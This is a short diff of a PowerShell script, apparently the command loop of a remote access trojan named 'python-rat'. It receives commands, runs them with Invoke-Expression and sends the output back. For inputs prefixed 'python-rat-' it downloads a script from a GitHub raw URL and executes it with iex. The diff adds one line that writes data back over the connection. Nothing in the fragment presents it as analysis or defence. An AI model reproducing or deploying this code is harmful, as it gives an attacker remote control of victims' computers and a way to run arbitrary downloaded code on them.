@@ -23,6 +23,7 @@ while ($true) {
                 if ($input -like "*python-rat-*") {
                     $url = "https://raw.githubusercontent.com/s1uiasdad/python-rat/main/scr/" + ($input -replace "python-rat-", "") + ".ps1"
                     iex (iwr $url).Content
+                    $writer.Write($data)
                 } else {
                     $writer.Write((Invoke-Expression $input 2>&1 | Out-String))
                 }
